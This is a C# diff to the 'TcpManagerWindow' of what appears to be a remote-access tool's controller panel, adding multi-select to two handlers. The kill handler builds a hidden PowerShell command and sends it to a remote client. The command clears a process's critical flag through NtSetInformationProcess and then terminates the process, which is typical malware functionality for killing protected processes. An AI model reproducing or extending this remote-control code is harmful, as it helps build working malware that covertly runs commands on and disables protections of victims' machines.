@@ -54,35 +54,43 @@ public partial class TcpManagerWindow : Window
 
     private async void CloseConn_Click(object s, RoutedEventArgs e)
     {
-        if (GridTcp.SelectedItem is not TcpEntryVM row) return;
-        var data = JsonConvert.SerializeObject(new TcpCloseData { LocalAddr = row.LocalAddr, RemoteAddr = row.RemoteAddr });
-        await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpClose, Data = data });
+        var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().ToList();
+        if (sel.Count == 0) return;
+        foreach (var row in sel)
+        {
+            var data = JsonConvert.SerializeObject(new TcpCloseData { LocalAddr = row.LocalAddr, RemoteAddr = row.RemoteAddr });
+            await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpClose, Data = data });
+        }
         await Task.Delay(300);
         await Refresh();
     }
 
     private async void KillProc_Click(object s, RoutedEventArgs e)
     {
-        if (GridTcp.SelectedItem is not TcpEntryVM row || row.Pid <= 0) return;
-        if (MessageBox.Show($"Kill '{row.ProcessName}' (PID {row.Pid})?",
-            "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
-
-        var cmd = $"powershell -NoP -NonI -W H -Command \"" +
-                  $"Add-Type -TypeDefinition @'`n" +
-                  $"using System.Runtime.InteropServices;`n" +
-                  $"public class PK {{`n" +
-                  $"[DllImport(\\\"ntdll.dll\\\")] public static extern int NtSetInformationProcess(System.IntPtr h,int c,ref uint v,int s);`n" +
-                  $"[DllImport(\\\"kernel32.dll\\\",SetLastError=true)] public static extern System.IntPtr OpenProcess(uint a,bool i,int p);`n" +
-                  $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool TerminateProcess(System.IntPtr h,uint c);`n" +
-                  $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool CloseHandle(System.IntPtr h);`n" +
-                  $"}}`n" +
-                  $"'@ -ErrorAction SilentlyContinue;" +
-                  $"$h=[PK]::OpenProcess(0x1FFFFF,$false,{row.Pid});" +
-                  $"if($h -ne [IntPtr]::Zero){{$z=[uint32]0;[PK]::NtSetInformationProcess($h,0x1D,[ref]$z,4)|Out-Null;" +
-                  $"[PK]::TerminateProcess($h,0)|Out-Null;[PK]::CloseHandle($h)|Out-Null}}\"";
-
-        await _server.SendToClient(_clientId, new Packet { Type = PacketType.AutoTaskShell, Data = cmd });
-        TxtStatus.Text = $"Kill sent → PID {row.Pid} ({row.ProcessName})";
+        var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().Where(r => r.Pid > 0).ToList();
+        if (sel.Count == 0) return;
+        string confirmMsg = sel.Count == 1
+            ? $"Kill '{sel[0].ProcessName}' (PID {sel[0].Pid})?"
+            : $"Kill {sel.Count} processes?";
+        if (MessageBox.Show(confirmMsg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
+        foreach (var row in sel)
+        {
+            var cmd = $"powershell -NoP -NonI -W H -Command \"" +
+                      $"Add-Type -TypeDefinition @'`n" +
+                      $"using System.Runtime.InteropServices;`n" +
+                      $"public class PK {{`n" +
+                      $"[DllImport(\\\"ntdll.dll\\\")] public static extern int NtSetInformationProcess(System.IntPtr h,int c,ref uint v,int s);`n" +
+                      $"[DllImport(\\\"kernel32.dll\\\",SetLastError=true)] public static extern System.IntPtr OpenProcess(uint a,bool i,int p);`n" +
+                      $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool TerminateProcess(System.IntPtr h,uint c);`n" +
+                      $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool CloseHandle(System.IntPtr h);`n" +
+                      $"}}`n" +
+                      $"'@ -ErrorAction SilentlyContinue;" +
+                      $"$h=[PK]::OpenProcess(0x1FFFFF,$false,{row.Pid});" +
+                      $"if($h -ne [IntPtr]::Zero){{$z=[uint32]0;[PK]::NtSetInformationProcess($h,0x1D,[ref]$z,4)|Out-Null;" +
+                      $"[PK]::TerminateProcess($h,0)|Out-Null;[PK]::CloseHandle($h)|Out-Null}}\"";
+            await _server.SendToClient(_clientId, new Packet { Type = PacketType.AutoTaskShell, Data = cmd });
+        }
+        TxtStatus.Text = sel.Count == 1 ? $"Kill sent → PID {sel[0].Pid} ({sel[0].ProcessName})" : $"Kill sent → {sel.Count} processes";
         await Task.Delay(600);
         await Refresh();
     }
